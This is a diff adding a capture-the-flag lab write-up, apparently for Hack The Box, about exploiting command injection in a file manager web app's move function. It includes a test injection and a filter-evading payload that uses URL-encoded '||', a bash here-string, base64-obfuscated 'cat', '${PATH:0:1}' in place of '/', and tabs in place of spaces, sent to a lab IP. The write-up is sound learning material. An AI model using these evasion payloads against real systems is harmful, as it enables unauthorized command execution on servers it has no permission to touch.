@@ -1,0 +1,172 @@
+---
+sticker: emoji//1f4bb
+---
+You are contracted to perform a penetration test for a company, and through your pentest, you stumble upon an interesting file manager web application. As file managers tend to execute system commands, you are interested in testing for command injection vulnerabilities.
+
+Use the various techniques presented in this module to detect a command injection vulnerability and then exploit it, evading any filters in place.
+
+
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250205145850.png)
+
+## Reconnaissance
+---
+
+Once we've authenticated, we can see the following:
+
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250205145916.png)
+
+We got a lot of functions in this page, being:
+
+```ad-summary
+1. Direct Link
+2. Preview
+3. Copy to
+4. Download
+```
+
+After checking each of them, I found the following in the `Copy to` function:
+
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250205150700.png)
+
+We have a `Copy` and `Move` function in this page, they go by the following parameters:
+
+Copy:
+```
+/index.php?to=&from=51459716.txt&finish=1
+```
+
+Move:
+
+```
+/index.php?to=&from=51459716.txt&finish=1&move=1 
+```
+
+In the move URL, if we modify the to value to empty, we can see the following:
+
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250205153325.png)
+
+Which means, it could be vulnerable to command injection, let's try sending a simple payload like:
+
+```
+/index.php?to=&from=51459716.txt;uname&finish=1&move=1
+```
+
+We will see the following:
+
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250205153433.png)
+
+This is indeed vulnerable to command injection, let's craft our payload to read the flag.
+
+## Exploitation
+---
+
+Commands like `cat`, `mv` and `ls` are blocked, we need to bypass them using what we've learned in this module, let's do the following payload:
+
+```
+%7C%7Cbash<<<$(base64%09-d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK)
+```
+
+```ad-important
+#### Breakdown
+---
+### **1. URL Decoding First**
+
+- `%7C%7C` → `||` (double pipe operator in Linux).
+    
+- `%09` → Tab character (used to replace spaces).
+    
+
+Decoded payload:
+
+
+`||bash<<<$(base64 -d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK)`
+
+
+---
+
+### **2. Command Structure**
+
+- **`||`**: Execute the second command **regardless** of whether the first command (`mv`, in the original app) succeeds or fails.
+    
+- **`bash<<<`**: Pass the following string as input to `bash` for execution.
+    
+
+---
+
+### **3. Decoding the Base64 String**
+
+The inner command is:
+
+`$(base64 -d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK)`
+
+- **`base64 -d`**: Decodes a Base64-encoded string.
+    
+- **`<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK`**: Passes the Base64 string to `base64 -d`.
+    
+
+**Decoding the Base64**:
+
+
+`echo "Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK" | base64 -d`
+
+**Result**:
+
+`cat ${PATH:0:1}flag.txt`
+
+---
+
+### **4. Breaking Down the Final Command**
+
+The decoded command is:
+
+`cat ${PATH:0:1}flag.txt`
+
+- **`${PATH:0:1}`**: Extracts the first character of the `PATH` environment variable (which is `/`).
+    
+    - Example: If `PATH=/usr/local/bin:/usr/bin`, `${PATH:0:1}` → `/`.
+        
+- **Result**: `cat /flag.txt`.
+    
+
+---
+
+### **5. Why Use These Techniques?**
+
+- **`||`**: Bypasses command injection filters by executing regardless of the first command's success.
+    
+- **`base64`**: Obfuscates the command to bypass keyword filters (e.g., `cat`, `/`).
+    
+- **`${PATH:0:1}`**: Avoids using `/` directly (common blacklisted character).
+    
+- **`%09` (tab)**: Replaces spaces to bypass space filters.
+    
+
+---
+
+### **Full Payload Flow**
+
+1. The app runs `mv [file] [to]`.
+    
+2. The payload injects `||bash<<<$(base64 -d<<<...)`.
+    
+3. The Base64 string decodes to `cat /flag.txt`.
+    
+4. `bash` executes the decoded command, printing the flag.
+```
+
+If we needed to look around for the flag, we'd need to use more payloads, since this is not needed, we can simply use this one.
+
+So, let's send it like this:
+
+```
+http://94.237.54.42:31196/index.php?to=%7C%7Cbash<<<$(base64%09-d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK)&from=51459716.txt&finish=1&move=1
+```
+
+We will see the following output:
+
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250205153914.png)
+
+Flag is `HTB{c0mm4nd3r_1nj3c70r}`
+
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250205154011.png)
+
